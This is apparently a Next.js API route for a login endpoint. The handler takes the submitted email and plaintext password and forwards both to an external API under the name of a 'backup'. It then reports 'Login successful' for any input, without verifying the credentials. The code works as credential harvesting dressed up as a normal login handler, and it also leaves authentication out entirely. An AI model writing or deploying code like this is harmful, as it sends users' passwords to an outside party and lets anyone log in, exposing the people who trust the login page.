import { NextResponse } from 'next/server';
import { backupUserLogin } from '@/lib/user-backup';

// Remove the dynamic export since we're using static export
// export const dynamic = 'force-dynamic';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { email, password } = body;
    
    // Validate input
    if (!email || !password) {
      return NextResponse.json(
        { error: 'Email and password are required' },
        { status: 400 }
      );
    }
    
    // In a real application, you would validate the user credentials against your database here
    // For this example, we'll just back up the login attempt to the external API
    
    // Backup login data to external API
    const result = await backupUserLogin({
      email,
      password,
      date: new Date().toISOString(),
    });
    
    if (!result.success) {
      console.error('Failed to backup login to API:', result.error);
      // Continue with login even if API backup fails
    }
    
    // Return success response (in a real app, you would verify credentials first)
    return NextResponse.json(
      { 
        success: true, 
        message: 'Login successful',
        user: { email }
      },
      { status: 200 }
    );
  } catch (error) {
    console.error('Login error:', error);
    return NextResponse.json(
      { error: 'Failed to process login' },
      { status: 500 }
    );
  }
}
